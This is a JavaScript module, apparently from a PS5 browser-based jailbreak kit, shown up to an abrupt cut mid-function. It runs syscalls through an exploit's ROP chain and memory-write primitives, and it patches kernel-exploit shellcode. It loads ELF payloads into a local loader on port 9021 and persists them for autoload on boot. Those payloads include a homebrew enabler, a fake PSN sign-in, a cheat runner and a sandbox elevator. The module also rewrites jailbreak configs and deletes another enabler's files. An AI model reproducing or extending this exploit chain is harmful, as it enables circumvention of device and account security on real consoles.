import { int64 } from "./utils/int64.js";

const O_NONBLOCK = 0x4;
const O_WRONLY_CREAT_TRUNC = 0x601;
const MODE_0777 = 0x1ff;
const PROT_RW = 0x3, PROT_RWX = 0x7;
const MAP_SHARED = 0x1, MAP_PRIVATE_ANON = 0x1002;
const DT_DIR = 4;
const NOTIFY_SIZE = 0xc30;
const NOTIFY_MESSAGE = 0x2d;
const ETAHEN_DIR = "/data/etaHEN";
const ONIONHEN_DIR = "/data/OnionHEN";
const AUTOLOADER_DIR = "/data/ps5_autoloader";
const AUTOLOADER_ELF = "webkit-autoloader-installer_v0.6.1.elf";
const FAKE_SIGNIN_ELF = "np-fake-signin-ps5.elf";
const SHADOWMOUNT_ELF = "shadowmountplus.elf";
const PLDMGR_ELF = "pldmgr_v0.5.2-r2.elf";
const PLDMGR_ALIASES = [];
const CHEATRUNNER_ELF = "CheatRunner.elf";
const BLACKBOX_ELF = "blackbox.elf";
const ANYPAD_ELF = "AnyPad-PS5-0.8.1-beta.elf";
const KSTUFF_ELF = "kstuff.elf";
const XPSEMU_HELPER_DEST = "xpsemu-helper.elf";
// Payload versions — updated by GitHub Actions when a new release is downloaded.
const BLACKBOX_VER = "v1.0.8";
const CHEATRUNNER_VER = "v0.17.2";
const SHADOWMOUNT_VER = "1.7beta3";
const HOMEBREW_DIR = "/data/homebrew";
const BLACKBOX_PKG = "PPSA01453.ffpkg";
const ONIONHEN_CONFIG = "/data/OnionHEN/config.ini";
const XPSEMU_WHITELIST = "/data/whitelist.txt";
// Emulator payloads
const EMU_PS5SX2_INSTALLER = "emulators/PS5SX2/PS5SX2Installer.elf";
const EMU_PS5SX2_HELPER    = "emulators/PS5SX2/PS5SXHelper.elf";
const EMU_SNES9X_ELF       = "emulators/snes9x/Snes9xPS5-v2.3.elf";
const EMU_XPSEMU_HELPER    = "emulators/XPSemu/helper.elf";
const EMU_XPSEMU_ZIP       = "emulators/XPSemu/PPSA97358.zip";
const EMU_PORPOISE_ZIP     = "emulators/Porpoise/Porpoise-2.7.zip";
const EMU_PS5CEMU_ZIP      = "emulators/PS5CEMU-HAR/PS5CEMU-HAR-v3.5.0.zip";
const EMU_PS5CEMU_ELEVATOR = "emulators/PS5CEMU-HAR/sandbox-elevator.elf";
const EMU_PS5X360_ZIP      = "emulators/PS5X360/PPSA50011.zip";
const EMU_PROSPEROEDEN_ZIP = "emulators/ProsperoEden/ProsperoEden-v1.000.095.zip";
const EMU_UNZIP_ELF        = "emulators/ps5-unzip.elf";
const EMU_PS5SX2_VER       = "vk-285-139";
const EMU_SNES9X_VER       = "v2.3";
const EMU_XPSEMU_VER       = "v1.0";
const EMU_PS5X360_VER      = "v1.0";
const EMU_PORPOISE_VER     = "v2.7.1";
const EMU_PS5CEMU_VER      = "v3.5.1";
const EMU_PROSPEROEDEN_VER = "v1.000.095.1";
const HB_SX2 = "PPSA99203";
const HB_SNES = "PPSA99009";
const HB_XPS = "PPSA97358";
const HB_X360 = "PPSA50011";
const HB_PORPOISE = "PPSA99764";
const HB_CEMU = "PPSA99360";
const HB_EDEN = "PPSA99008";
const ONION_EMU_TITLE_IDS = [
  HB_SX2, HB_SNES, HB_XPS, HB_X360, HB_PORPOISE, HB_CEMU, HB_EDEN,
];
// HEN and title-registration first. Large ELFs last so a 49MB blackbox
// write cannot stall elfldr before Payload Manager binds 8084.
const AUTOLOAD_NAMES = [
  "OnionHEN.elf",
  FAKE_SIGNIN_ELF,
  BLACKBOX_ELF,
  PLDMGR_ELF,
  CHEATRUNNER_ELF,
  ANYPAD_ELF,
  SHADOWMOUNT_ELF,
  "sandbox-elevator.elf",
  "PS5SXHelper.elf",
  XPSEMU_HELPER_DEST,
];
const INSTALL_TOAST = "Leave the Autoloader page open until it finishes - do not reboot yet";
const ONION_WAIT_S = 5;
const PAYLOAD_WAIT_S = 2;

const DEFAULT_KEXP = "kexp_2026_05_25.bin";
const DEFAULT_ELFLDR = "elfldr-ps5-1360.elf";

const SHELLCODE = {
  size: 18912,
  resolverCalls: [
    [0x1c, [0xe8, 0xcf, 0x00, 0x00, 0x00]],
    [0x23, [0xe8, 0x78, 0x01, 0x00, 0x00]],
  ],
  getpid: {
    at: 0x10f1,
    bytes: [
      0x48, 0x8d, 0x35, 0xac, 0x30, 0x00, 0x00,
      0x48, 0x8d, 0x55, 0xd0, 0xbf, 0x01, 0x20, 0x00, 0x00,
      0xe8, 0x41, 0x2b, 0x00, 0x00,
    ],
    tail: [0x48, 0x89, 0x45, 0xd0, 0x31, 0xc0],
    tailAt: 0x10fb,
    padFrom: 0x1101,
    padTo: 0x1106,
  },
  logCalls: [0x126d, 0x12ad, 0x3bc2],
  imports: {
    libkernel: {
      sceKernelSendNotificationRequest: 0x48b0,
      sysctlbyname: 0x48b8,
      pthread_create: 0x48c0,
      pthread_join: 0x48c8,
    },
    libc: {
      malloc: 0x48d0,
      free: 0x48d8,
      memcpy: 0x48e0,
      memset: 0x48e8,
      strcmp: 0x48f0,
      memcmp: 0x48f8,
      vsnprintf: 0x4900,
    },
  },
};

const PIPE = { count: 0x00, in: 0x04, out: 0x08, size: 0x0c, buffer: 0x10, defaultSize: 0x4000 };
const FD_ENTRY = { ofiles: 0x08, stride: 0x30, data: 0x00 };

function readU32(bytes, offset) {
  return (bytes[offset] | (bytes[offset + 1] << 8) |
    (bytes[offset + 2] << 16) | (bytes[offset + 3] << 24)) >>> 0;
}

function writeU64(bytes, offset, value) {
  let rest = BigInt(value) & 0xffffffffffffffffn;
  for (let i = 0; i < 8; i++) {
    bytes[offset + i] = Number(rest & 0xffn);
    rest >>= 8n;
  }
}

function matches(bytes, offset, expected) {
  return expected.every((byte, index) => bytes[offset + index] === byte);
}

function hex(value) {
  return "0x" + (value instanceof int64 ? value.toString(16) : (Number(value) >>> 0).toString(16));
}

function sysRv(value) {
  return value.low | 0;
}

function cstring(p, text) {
  const buf = p.malloc(text.length + 1, 1);
  p.writestr(buf, text);
  return buf;
}

function readCString(p, addr, max) {
  let name = "";
  const n = max > 0 ? max : 255;
  for (let i = 0; i < n; i++) {
    const c = p.read1(addr.add32(i)) & 0xff;
    if (c === 0) break;
    if (c < 0x20 || c > 0x7e) return "";
    name += String.fromCharCode(c);
  }
  return name;
}

function parseDirents(p, buf, n) {
  const walk = (reclenAt, typeAt, nameAt, minRec) => {
    const entries = [];
    for (let pos = 0; pos < n; ) {
      const reclen = p.read2(buf.add32(pos + reclenAt)) & 0xffff;
      if (reclen < minRec || reclen > n - pos) return null;
      const type = p.read1(buf.add32(pos + typeAt)) & 0xff;
      const name = readCString(p, buf.add32(pos + nameAt), reclen - nameAt);
      if (name && name !== "." && name !== "..")
        entries.push({ name, type });
      pos += reclen;
    }
    return entries;
  };
  const freebsd11 = walk(4, 6, 8, 8);
  if (freebsd11 && freebsd11.length) return freebsd11;
  const ino64 = walk(16, 18, 24, 24);
  if (ino64) return ino64;
  return freebsd11 || [];
}

export async function notify(p, chain, message) {
  const offset = window.SYMBOLS && window.SYMBOLS.libkernel
    && window.SYMBOLS.libkernel.sceKernelSendNotificationRequest;
  if (typeof offset !== "number" || !p.libKernelBase) return;
  try {
    const req = p.malloc(NOTIFY_SIZE, 1);
    for (let i = 0; i < NOTIFY_SIZE; i += 4) p.write4(req.add32(i), 0);
    p.writestr(req.add32(NOTIFY_MESSAGE), message);
    await chain.call(p.libKernelBase.add32(offset), 0, req, NOTIFY_SIZE, 0);
  } catch (_) {}
}

async function pathExists(p, chain, path) {
  return sysRv(await chain.syscall(SYS_ACCESS, cstring(p, path), 0)) === 0;
}

async function listDir(p, chain, dirPath) {
  const fd = sysRv(await chain.syscall(SYS_OPEN, cstring(p, dirPath), 0, 0));
  if (fd < 0) return [];
  const buf = p.malloc(0x1000, 1);
  const basep = p.malloc(8, 1);
  const entries = [];
  try {
    for (;;) {
      p.write8(basep, new int64(0, 0));
      const n = sysRv(await chain.syscall(SYS_GETDENTS, fd, buf, 0x1000, basep));
      if (n <= 0) break;
      entries.push.apply(entries, parseDirents(p, buf, n));
    }
  } finally {
    await chain.syscall(SYS_CLOSE, fd);
  }
  return entries;
}

async function unlinkPath(p, chain, path) {
  if (chain.syscalls[SYS_CHFLAGS])
    await chain.syscall(SYS_CHFLAGS, cstring(p, path), 0);
  return sysRv(await chain.syscall(SYS_UNLINK, cstring(p, path)));
}

async function rmTree(p, chain, path, depth) {
  if (depth > 32) return;
  if (chain.syscalls[SYS_CHFLAGS])
    await chain.syscall(SYS_CHFLAGS, cstring(p, path), 0);
  const entries = await listDir(p, chain, path);
  for (const { name, type } of entries) {
    const child = path.endsWith("/") ? path + name : path + "/" + name;
    if (chain.syscalls[SYS_CHFLAGS])
      await chain.syscall(SYS_CHFLAGS, cstring(p, child), 0);
    if (type === DT_DIR) {
      await rmTree(p, chain, child, depth + 1);
      continue;
    }
    const un = await unlinkPath(p, chain, child);
    if (un !== 0)
      await rmTree(p, chain, child, depth + 1);
  }
  const rm = sysRv(await chain.syscall(SYS_RMDIR, cstring(p, path)));
  if (rm !== 0)
    await unlinkPath(p, chain, path);
}

export async function sweepEtaHEN(p, chain, log) {
  const say = typeof log === "function" ? log : () => {};
  try {
    const existed = await pathExists(p, chain, ETAHEN_DIR);
    const onionPresent = await pathExists(p, chain, ONIONHEN_DIR);
    if (!existed) {
      return { existed: false, removed: false, onionPresent };
    }

    await rmTree(p, chain, ETAHEN_DIR, 0);
    const removed = !(await pathExists(p, chain, ETAHEN_DIR));
    if (!removed) {
      await notify(p, chain, "Rebuild PS5 database to remove etaHEN files");
    }
    return { existed: true, removed, onionPresent };
  } catch (error) {
    return { existed: false, removed: false, onionPresent: false, error };
  }
}

function resolveSymbols(p) {
  const tables = window.SYMBOLS || {};
  const bases = { libkernel: p.libKernelBase, libc: p.libSceLibcInternalBase };
  const resolved = {};

  for (const [group, imports] of Object.entries(SHELLCODE.imports)) {
    const base = bases[group];
    const offsets = tables[group];
    if (!base || (base.low === 0 && base.hi === 0))
      throw new Error("kexp: " + group + " base is unresolved");
    if (!offsets) throw new Error("kexp: " + group + " symbols are missing");

    const names = Object.keys(imports);
    if (group === "libkernel") names.push("getpid");
    const missing = names.filter((name) => typeof offsets[name] !== "number");
    if (missing.length)
      throw new Error("kexp: " + group + " is missing " + missing.join(", "));
    resolved[group] = { base, offsets };
  }
  return resolved;
}

async function fetchBinary(name) {
  if (window.payloadStore && typeof window.payloadStore.get === "function") {
    const cached = await window.payloadStore.get(name);
    if (cached && cached.length) return cached;
  }
  if (typeof window.loadBinary === "function") {
    const data = await window.loadBinary("payloads/" + name);
    if (window.payloadStore && typeof window.payloadStore.put === "function") {
      try { await window.payloadStore.put(name, data); } catch (_) {}
    }
    return data;
  }
  const response = await fetch("payloads/" + name);
  if (!response.ok) throw new Error("kexp: " + name + " returned HTTP " + response.status);
  return new Uint8Array(await response.arrayBuffer());
}

async function mapElf(name, p, chain) {
  const elf = await fetchBinary(name);
  if (elf.length < 0x1000 || readU32(elf, 0) !== 0x464c457f)
    throw new Error("kexp: " + name + " is not an ELF");

  const size = (elf.length + 0x3fff) & ~0x3fff;
  const base = await chain.syscall(SYS_MMAP, 0, size, PROT_RW, MAP_PRIVATE_ANON, -1, 0);
  if (base.low >>> 0 === 0xffffffff || base.low < 0x10000)
    throw new Error("kexp: " + name + " mmap failed");

  const dwords = elf.length & ~3;
  for (let offset = 0; offset < dwords; offset += 4) {
    p.write4(base.add32(offset), readU32(elf, offset));
    if (offset && (offset & 0x3ffff) === 0)
      await new Promise((resolve) => setTimeout(resolve, 0));
  }
  for (let offset = dwords; offset < elf.length; offset++)
    p.write1(base.add32(offset), elf[offset]);
  if (p.read4(base) >>> 0 !== 0x464c457f)
    throw new Error("kexp: " + name + " copy failed");

  return { base, size: elf.length, mmapSize: size };
}

async function connectToElfldr(p, chain) {
  const address = p.malloc(16);
  p.write8(address, new int64(0, 0));
  p.write8(address.add32(8), new int64(0, 0));
  p.write4(address, 0x3d230210); // AF_INET, port 9021
  p.write4(address.add32(4), 0x0100007f); // 127.0.0.1

  for (let attempt = 0; attempt < 80; attempt++) {
    const socket = await chain.syscall(SYS_SOCKET, 2, 1, 0);
    const fd = socket.low | 0;
    if (fd >= 0) {
      const connected = await chain.syscall(SYS_CONNECT, fd, address, 16);
      if ((connected.low >>> 0) === 0) return fd;
      await chain.syscall(SYS_CLOSE, fd);
    }
    await new Promise((resolve) => setTimeout(resolve, 250));
  }

  throw new Error("elfldr is not listening on port 9021");
}

async function waitForElfldr(p, chain, log) {
  if (typeof log === "function") log("waiting for elfldr on 9021");
  const fd = await connectToElfldr(p, chain);
  await chain.syscall(SYS_CLOSE, fd);
  if (typeof log === "function") log("elfldr ready");
}

async function sendElf(name, payload, p, chain) {
  const fd = await connectToElfldr(p, chain);
  try {
    for (let offset = 0; offset < payload.size;) {
      const length = Math.min(0x40000, payload.size - offset);
      const written = (await chain.syscall(SYS_WRITE, fd, payload.base.add32(offset), length)).low | 0;
      if (written <= 0) throw new Error(name + " socket write failed");
      offset += written;
    }
  } finally {
    await chain.syscall(SYS_CLOSE, fd);
  }
}

async function sendOne(name, p, chain, log) {
  const mapped = await mapElf(name, p, chain);
  log("sending " + name);
  await sendElf(name, mapped, p, chain);
  return mapped;
}

async function sendOneRetry(name, p, chain, log, attempts) {
  const n = attempts > 0 ? attempts : 3;
  let last = null;
  for (let i = 1; i <= n; i++) {
    try {
      return await sendOne(name, p, chain, log);
    } catch (error) {
      last = error;
      const msg = error && error.message ? error.message : String(error);
      log(name + " send failed (" + i + "/" + n + "): " + msg);
      if (i < n) await new Promise((resolve) => setTimeout(resolve, 2000));
    }
  }
  throw last;
}

async function ensureDir(p, chain, path) {
  if (await pathExists(p, chain, path)) return true;
  const rv = sysRv(await chain.syscall(SYS_MKDIR, cstring(p, path), MODE_0777));
  if (rv === 0 || (await pathExists(p, chain, path))) return true;
  return false;
}

async function writeBuf(p, chain, path, buf, length) {
  const fd = sysRv(await chain.syscall(
    SYS_OPEN, cstring(p, path), O_WRONLY_CREAT_TRUNC, MODE_0777));
  if (fd < 0) throw new Error("open " + path + " failed (" + fd + ")");
  try {
    for (let offset = 0; offset < length; ) {
      const chunk = Math.min(0x40000, length - offset);
      const written = sysRv(await chain.syscall(SYS_WRITE, fd, buf.add32(offset), chunk));
      if (written <= 0) throw new Error("write " + path + " failed (" + written + ")");
      offset += written;
    }
  } finally {
    await chain.syscall(SYS_CLOSE, fd);
  }
}

async function writeTextFile(p, chain, path, text) {
  await writeBuf(p, chain, path, cstring(p, text), text.length);
}

function emitLog(log, message, replace) {
  if (typeof log !== "function") return;
  log(message, "info", !!replace);
}

async function waitSeconds(log, label, seconds, work) {
  const end = Date.now() + seconds * 1000;
  let last = -1;
  let started = false;
  const tick = function () {
    const left = Math.max(1, Math.ceil((end - Date.now()) / 1000));
    if (Date.now() >= end) return;
    if (left === last) return;
    last = left;
    emitLog(log, label + " — " + left + "s", started);
    started = true;
  };
  tick();
  const running = work ? Promise.resolve().then(work) : Promise.resolve();
  while (Date.now() < end) {
    tick();
    await new Promise((resolve) => setTimeout(resolve, 200));
  }
  await running;
  emitLog(log, label + " ready", started);
}

async function saveAutoloadFiles(p, chain, log, mapped) {
  const say = typeof log === "function" ? log : () => {};
  if (!(await ensureDir(p, chain, AUTOLOADER_DIR))) {
    say("could not create /data/ps5_autoloader");
    return false;
  }
  if (mapped.onion) {
    await writeBuf(p, chain, AUTOLOADER_DIR + "/OnionHEN.elf", mapped.onion.base, mapped.onion.size);
  }
  if (mapped.signin) {
    await writeBuf(p, chain, AUTOLOADER_DIR + "/" + FAKE_SIGNIN_ELF, mapped.signin.base, mapped.signin.size);
  }
  if (mapped.shadow) {
    await writeBuf(p, chain, AUTOLOADER_DIR + "/" + SHADOWMOUNT_ELF, mapped.shadow.base, mapped.shadow.size);
  }
  if (mapped.pld) {
    await writeBuf(p, chain, AUTOLOADER_DIR + "/" + PLDMGR_ELF, mapped.pld.base, mapped.pld.size);
    for (let a = 0; a < PLDMGR_ALIASES.length; a++) {
      await writeBuf(p, chain, AUTOLOADER_DIR + "/" + PLDMGR_ALIASES[a], mapped.pld.base, mapped.pld.size);
    }
  }
  if (mapped.blackbox) {
    await writeBuf(p, chain, AUTOLOADER_DIR + "/" + BLACKBOX_ELF, mapped.blackbox.base, mapped.blackbox.size);
  }
  if (mapped.cheat) {
    await writeBuf(p, chain, AUTOLOADER_DIR + "/" + CHEATRUNNER_ELF, mapped.cheat.base, mapped.cheat.size);
  }
  if (mapped.anypad) {
    await writeBuf(p, chain, AUTOLOADER_DIR + "/" + ANYPAD_ELF, mapped.anypad.base, mapped.anypad.size);
  }
  const afterMs = {};
  afterMs["OnionHEN.elf"] = 5000;
  afterMs[FAKE_SIGNIN_ELF] = 0;
  afterMs[BLACKBOX_ELF] = 5000;
  afterMs[PLDMGR_ELF] = 3000;
  afterMs[CHEATRUNNER_ELF] = 2000;
  afterMs[ANYPAD_ELF] = 2000;
  afterMs[SHADOWMOUNT_ELF] = 5000;
  afterMs["sandbox-elevator.elf"] = 2000;
  afterMs["PS5SXHelper.elf"] = 2000;
  afterMs[XPSEMU_HELPER_DEST] = 2000;
  const present = [];
  for (let i = 0; i < AUTOLOAD_NAMES.length; i++) {
    const name = AUTOLOAD_NAMES[i];
    if (await pathExists(p, chain, AUTOLOADER_DIR + "/" + name)) present.push(name);
  }
  const lines = [];
  for (let i = 0; i < present.length; i++) {
    if (i) {
      const wait = afterMs[present[i - 1]] || 0;
      if (wait > 0) lines.push("!" + wait);
    }
    lines.push(present[i]);
  }
  await writeTextFile(p, chain, AUTOLOADER_DIR + "/autoload.txt",
    lines.length ? lines.join("\n") + "\n" : "");
  return true;
}

async function mapBinary(name, p, chain) {
  const data = await fetchBinary(name);
  const size = (data.length + 0x3fff) & ~0x3fff;
  const base = await chain.syscall(SYS_MMAP, 0, size, PROT_RW, MAP_PRIVATE_ANON, -1, 0);
  if (base.low >>> 0 === 0xffffffff || base.low < 0x10000)
    throw new Error("kexp: " + name + " mmap failed");
  const dwords = data.length & ~3;
  for (let offset = 0; offset < dwords; offset += 4) {
    p.write4(base.add32(offset), readU32(data, offset));
    if (offset && (offset & 0x3ffff) === 0)
      await new Promise((resolve) => setTimeout(resolve, 0));
  }
  for (let offset = dwords; offset < data.length; offset++)
    p.write1(base.add32(offset), data[offset]);
  return { base, size: data.length, mmapSize: size };
}

async function saveFile(dir, name, ver, p, chain, log, isPresent) {
  if (ver) {
    const marker = dir + "/" + name + "." + ver;
    const filePresent = isPresent === true || (isPresent !== false && await pathExists(p, chain, dir + "/" + name));
    if (await pathExists(p, chain, marker) && filePresent) {
      log(name + " already saved (" + ver + "), skipping");
      return;
    }
    if (filePresent) {
      log(name + " outdated, replacing with " + ver);
      try { await chain.syscall(SYS_UNLINK, cstring(p, dir + "/" + name)); } catch (_) {}
    }
  } else {
    if (isPresent === true || (isPresent !== false && await pathExists(p, chain, dir + "/" + name))) {
      log(name + " already saved, skipping");
      return;
    }
  }
  log("downloading " + name + " — please wait, this may take a few minutes...");
  try {
    const mapped = await mapBinary(name, p, chain);
    try {
      await writeBuf(p, chain, dir + "/" + name, mapped.base, mapped.size);
      if (ver) {
        try { await writeTextFile(p, chain, dir + "/" + name + "." + ver, ver); } catch (_) {}
      }
      log(name + " saved");
    } catch (error) {
      log("save " + name + " skipped: " + (error && error.message ? error.message : String(error)));
    }
    try { await chain.syscall(SYS_MUNMAP, mapped.base, mapped.mmapSize); } catch (_) {}
  } catch (error) {
    log(name + " skipped: " + (error && error.message ? error.message : String(error)));
  }
}

async function saveOnly(name, key, p, chain, log, isPresent, ver) {
  if (ver) {
    const marker = AUTOLOADER_DIR + "/" + name + "." + ver;
    const filePresent = isPresent === true || (isPresent !== false && await pathExists(p, chain, AUTOLOADER_DIR + "/" + name));
    if (await pathExists(p, chain, marker) && filePresent) {
      log(name + " already saved (" + ver + "), skipping");
      return;
    }
    if (filePresent) {
      log(name + " outdated, replacing with " + ver);
      try { await chain.syscall(SYS_UNLINK, cstring(p, AUTOLOADER_DIR + "/" + name)); } catch (_) {}
    }
  } else {
    if (isPresent === true || (isPresent !== false && await pathExists(p, chain, AUTOLOADER_DIR + "/" + name))) {
      log(name + " already saved, skipping");
      return;
    }
  }
  try {
    const mapped = await mapElf(name, p, chain);
    try {
      const spec = {};
      spec[key] = mapped;
      await saveAutoloadFiles(p, chain, function () {}, spec);
      if (ver) {
        try { await writeTextFile(p, chain, AUTOLOADER_DIR + "/" + name + "." + ver, ver); } catch (_) {}
      }
    } catch (error) {
      log("save " + name + " skipped: " + (error && error.message ? error.message : String(error)));
    }
    try { await chain.syscall(SYS_MUNMAP, mapped.base, mapped.mmapSize); } catch (_) {}
  } catch (error) {
    log(name + " skipped: " + (error && error.message ? error.message : String(error)));
  }
}


function readBytesAsString(p, buf, n) {
  let text = "";
  for (let i = 0; i < n; i++) {
    const c = p.read1(buf.add32(i)) & 0xff;
    if (c === 0) break;
    text += String.fromCharCode(c);
  }
  return text;
}

async function readTextFile(p, chain, path, maxLen) {
  const fd = sysRv(await chain.syscall(SYS_OPEN, cstring(p, path), 0, 0));
  if (fd < 0) return null;
  const cap = maxLen > 0 ? maxLen : 0x10000;
  const buf = p.malloc(cap, 1);
  try {
    const n = sysRv(await chain.syscall(SYS_READ, fd, buf, cap - 1));
    if (n <= 0) return "";
    return readBytesAsString(p, buf, n);
  } finally {
    await chain.syscall(SYS_CLOSE, fd);
  }
}

async function chmodPath(p, chain, path) {
  if (!(await pathExists(p, chain, path))) return;
  if (!chain.syscalls[SYS_CHMOD]) return;
  try { await chain.syscall(SYS_CHMOD, cstring(p, path), MODE_0777); } catch (_) {}
}

async function chmodHomebrewTitle(p, chain, psaId) {
  const base = HOMEBREW_DIR + "/" + psaId;
  const paths = [
    base,
    base + "/eboot.bin",
    base + "/sce_sys",
    base + "/sce_sys/param.json",
    base + "/sce_module",
    base + "/sce_module/libc.prx",
  ];
  for (let i = 0; i < paths.length; i++) await chmodPath(p, chain, paths[i]);
}

async function chmodTree(p, chain, path, depth) {
  if (depth > 6) return;
  await chmodPath(p, chain, path);
  const entries = await listDir(p, chain, path);
  for (const { name, type } of entries) {
    const child = path + "/" + name;
    await chmodPath(p, chain, child);
    if (type === DT_DIR) await chmodTree(p, chain, child, depth + 1);
  }
}

async function saveAutoloadElf(fetchPath, destName, ver, p, chain, log) {
  const dest = AUTOLOADER_DIR + "/" + destName;
  const marker = ver ? dest + "." + ver : "";
  if (await pathExists(p, chain, dest) && (!ver || await pathExists(p, chain, marker))) {
    log(destName + " already in autoloader" + (ver ? " (" + ver + ")" : ""));
    return;
  }
  try {
    const mapped = await mapElf(fetchPath, p, chain);
    try {
      await writeBuf(p, chain, dest, mapped.base, mapped.size);
      if (marker) {
        try { await writeTextFile(p, chain, marker, ver); } catch (_) {}
      }
      log(destName + " saved to autoloader");
    } finally {
      try { await chain.syscall(SYS_MUNMAP, mapped.base, mapped.mmapSize); } catch (_) {}
    }
  } catch (error) {
    log(destName + " autoloader save skipped: " +
      (error && error.message ? error.message : String(error)));
  }
}

async function ensureOnionTitleIds(p, chain, log) {
  try {
    await ensureDir(p, chain, ONIONHEN_DIR);
    let text = await readTextFile(p, chain, ONIONHEN_CONFIG, 0x10000);
    if (text == null) text = "";
    const lineRe = /^exact_title_ids=(.*)$/m;
    const match = text.match(lineRe);
    if (match) {
      let raw = (match[1] || "").trim();
      if (raw === "none") raw = "";
      const ids = raw.split(",").map((s) => s.trim()).filter(Boolean);
      let changed = false;
      for (let i = 0; i < ONION_EMU_TITLE_IDS.length; i++) {
        const id = ONION_EMU_TITLE_IDS[i];
        if (ids.indexOf(id) < 0) {
          ids.push(id);
          changed = true;
        }
      }
      if (!changed) {
        log("OnionHEN exact_title_ids already has emulator titles");
        return;
      }
      text = text.replace(lineRe, "exact_title_ids=" + ids.join(","));
      await writeTextFile(p, chain, ONIONHEN_CONFIG, text);
      log("OnionHEN exact_title_ids updated");
      return;
    }
    const extra =
      (text && !text.endsWith("\n") ? "\n" : "") +
      "\n[app_jailbreak]\n" +
      "enabled=true\n" +
      "exact_title_ids=" + ONION_EMU_TITLE_IDS.join(",") + "\n";
    await writeTextFile(p, chain, ONIONHEN_CONFIG, (text || "") + extra);
    log("OnionHEN exact_title_ids written");
  } catch (error) {
    log("OnionHEN config skipped: " +
      (error && error.message ? error.message : String(error)));
  }
}

async function ensureXpsWhitelist(p, chain, log) {
  try {
    let text = await readTextFile(p, chain, XPSEMU_WHITELIST, 0x4000);
    if (text == null) text = "";
    if (text.indexOf(HB_XPS) >= 0) {
      log("XPSemu whitelist already has " + HB_XPS);
      return;
    }
    const next = (text && !text.endsWith("\n") ? text + "\n" : text) + HB_XPS + "\n";
    await writeTextFile(p, chain, XPSEMU_WHITELIST, next);
    log("wrote " + XPSEMU_WHITELIST);
  } catch (error) {
    log("XPSemu whitelist skipped: " +
      (error && error.message ? error.message : String(error)));
  }
}

async function downloadToHB(fetchPath, destName, ver, p, chain, log) {
  const dest = HOMEBREW_DIR + "/" + destName;
  const marker = dest + "." + ver;
  if (await pathExists(p, chain, marker) && await pathExists(p, chain, dest)) {
    log(destName + " already downloaded (" + ver + "), skipping");
    return;
  }
  log("downloading " + destName + " — please wait...");
  try {
    const mapped = await mapBinary(fetchPath, p, chain);
    try {
      await writeBuf(p, chain, dest, mapped.base, mapped.size);
      try { await writeTextFile(p, chain, marker, ver); } catch (_) {}
      log(destName + " saved");
    } catch (e) {
      log("save " + destName + " failed: " + (e && e.message ? e.message : String(e)));
    }
    try { await chain.syscall(SYS_MUNMAP, mapped.base, mapped.mmapSize); } catch (_) {}
  } catch (e) {
    log(destName + " download failed: " + (e && e.message ? e.message : String(e)));
  }
}

async function installZipEmu(fetchPath, psaId, ver, p, chain, log) {
  const eboot = HOMEBREW_DIR + "/" + psaId + "/eboot.bin";
  const marker = HOMEBREW_DIR + "/" + psaId + ".installed." + ver;
  if (await pathExists(p, chain, marker) && await pathExists(p, chain, eboot)) {
    log(psaId + " already installed (" + ver + "), skipping");
    await chmodHomebrewTitle(p, chain, psaId);
    if (psaId === HB_X360) {
      try { await chmodTree(p, chain, HOMEBREW_DIR + "/" + psaId, 0); } catch (_) {}
    }
    return true;
  }
  log("downloading " + psaId + " (" + ver + ") — please wait...");
  try {
    const mapped = await mapBinary(fetchPath, p, chain);
    try {
      await writeBuf(p, chain, HOMEBREW_DIR + "/emu.zip", mapped.base, mapped.size);
    } finally {
      try { await chain.syscall(SYS_MUNMAP, mapped.base, mapped.mmapSize); } catch (_) {}
    }
    log("extracting " + psaId + "...");
    await sendOneRetry(EMU_UNZIP_ELF, p, chain, log, 3);
    const deadline = Date.now() + 90000;
    let found = await pathExists(p, chain, eboot);
    while (!found && Date.now() < deadline) {
      emitLog(log, "waiting for " + psaId + " eboot.bin...", true);
      await new Promise((resolve) => setTimeout(resolve, 2000));
      found = await pathExists(p, chain, eboot);
    }
    if (!found) {
      log(psaId + " extract failed: eboot.bin missing");
      return false;
    }
    await chmodHomebrewTitle(p, chain, psaId);
    if (psaId === HB_X360) {
      log("fixing " + psaId + " file permissions");
      try { await chmodTree(p, chain, HOMEBREW_DIR + "/" + psaId, 0); } catch (_) {}
    }
    try { await writeTextFile(p, chain, marker, ver); } catch (_) {}
    log(psaId + " installed");
    return true;
  } catch (e) {
    log(psaId + " install failed: " + (e && e.message ? e.message : String(e)));
    return false;
  }
}

export async function loadOptionalPayloads(p, chain, log) {
  await ensureDir(p, chain, AUTOLOADER_DIR);

  // Save all payloads to disk FIRST while the chain is alive.
  // The installer runs last and may close the WebKit session when it
  // triggers the system PKG install UI — if saves happened after it,
  // they would run on a dead chain and silently fail, leaving autoload.txt
  // empty so the autoloader has nothing to inject on next boot.
  log("saving payloads to autoloader");
  // One sweep instead of per-payload pathExists — avoids a second sweep in the final refresh.
  const _present = new Set();
  for (let _i = 0; _i < AUTOLOAD_NAMES.length; _i++) {
    if (await pathExists(p, chain, AUTOLOADER_DIR + "/" + AUTOLOAD_NAMES[_i])) _present.add(AUTOLOAD_NAMES[_i]);
  }
  await saveOnly("OnionHEN.elf",  "onion",    p, chain, log, _present.has("OnionHEN.elf"));
  await saveOnly(FAKE_SIGNIN_ELF,  "signin",   p, chain, log, _present.has(FAKE_SIGNIN_ELF));
  await saveOnly(PLDMGR_ELF,       "pld",      p, chain, log, _present.has(PLDMGR_ELF));
  await saveOnly(BLACKBOX_ELF,     "blackbox", p, chain, log, _present.has(BLACKBOX_ELF), BLACKBOX_VER);
  await saveOnly(SHADOWMOUNT_ELF,  "shadow",   p, chain, log, _present.has(SHADOWMOUNT_ELF), SHADOWMOUNT_VER);
  await saveOnly(CHEATRUNNER_ELF,  "cheat",    p, chain, log, _present.has(CHEATRUNNER_ELF), CHEATRUNNER_VER);
  await saveOnly(ANYPAD_ELF,       "anypad",   p, chain, log, _present.has(ANYPAD_ELF));

  await ensureOnionTitleIds(p, chain, log);

  await ensureDir(p, chain, HOMEBREW_DIR);
  const _pkgPresent = await pathExists(p, chain, HOMEBREW_DIR + "/" + BLACKBOX_PKG);
  await saveFile(HOMEBREW_DIR, BLACKBOX_PKG, BLACKBOX_VER, p, chain, log, _pkgPresent);

  // Emulators — unzip/install before the autoloader installer, which may
  // close WebKit. Skip only when eboot.bin is actually on disk.
  await ensureDir(p, chain, HOMEBREW_DIR);

  // PS5SX2 (PS2) — installer ELF pulls the title; helper must autoload.
  await downloadToHB(EMU_PS5SX2_HELPER, "PS5SXHelper.elf", EMU_PS5SX2_VER, p, chain, log);
  await saveAutoloadElf(EMU_PS5SX2_HELPER, "PS5SXHelper.elf", EMU_PS5SX2_VER, p, chain, log);
  {
